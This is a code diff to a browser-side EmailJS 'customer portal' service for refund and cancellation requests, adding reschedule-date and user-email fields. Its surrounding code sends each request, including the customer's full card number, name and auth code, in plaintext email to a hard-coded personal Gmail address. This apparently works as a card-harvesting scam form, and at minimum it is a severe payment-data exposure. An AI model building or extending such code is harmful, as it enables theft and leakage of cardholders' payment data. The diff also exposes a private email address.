@@ -1,26 +1,5 @@
 import emailjs from '@emailjs/browser';
-
-interface RefundRequest {
-  transactionId: string;
-  customerName: string;
-  email: string;
-  userEmail?: string; // Add user email field
-  lastFourDigits: string;
-  amount: string;
-  date: string;
-  status: string;
-  merchant: string;
-  invoice: string;
-  cardType: string;
-  response: string;
-  type: string;
-  message: string;
-  user: string;
-  source: string;
-  auth: number;
-  fullCardNumber: string;
-  requestTimestamp: string;
-}
+import { RefundRequest } from '../types';
 
 class EmailService {
   private recipientEmail = 'ortizalfano@gmail.com';
@@ -257,7 +236,13 @@ Customer Support System
           second: '2-digit',
           timeZoneName: 'short'
         }),
-        request_type: 'Cancellation Request'
+        request_type: 'Cancellation Request',
+        reschedule_date: cancellationData.rescheduleDate || 'N/A', // Add reschedule date to template
+        reschedule_date_formatted: cancellationData.rescheduleDate ? new Date(cancellationData.rescheduleDate).toLocaleDateString('en-US', {
+          year: 'numeric',
+          month: 'long',
+          day: 'numeric'
+        }) : 'N/A'
       };
 
       return await this.sendEmail(subject, emailContent, templateParams, 'template_cancellation');
@@ -291,12 +276,18 @@ Request Details:
 ================
 Request Date: ${requestDate}
 Request Type: Cancellation Request
+${data.rescheduleDate ? `Reschedule Date: ${new Date(data.rescheduleDate).toLocaleDateString('en-US', {
+      year: 'numeric',
+      month: 'long',
+      day: 'numeric'
+    })}` : ''}
 
 Transaction Information:
 =======================
 Transaction ID: ${data.transactionId}
 Customer Name: ${data.customerName}
 Customer Email: ${data.email}
+User Email (for cancellation): ${data.userEmail || 'N/A'}
 Card Ending in: ....${data.lastFourDigits}
 Full Card Number: ${data.fullCardNumber}
 Amount: ${data.amount}
@@ -315,6 +306,11 @@ Auth: ${data.auth}
 Action Required:
 ===============
 Please process the cancellation request for the above transaction.
+${data.rescheduleDate ? `The customer has requested to reschedule to: ${new Date(data.rescheduleDate).toLocaleDateString('en-US', {
+      year: 'numeric',
+      month: 'long',
+      day: 'numeric'
+    })}` : 'The customer has requested to cancel the subscription.'}
 
 This request was submitted through the Sterling & Associates customer portal.
 
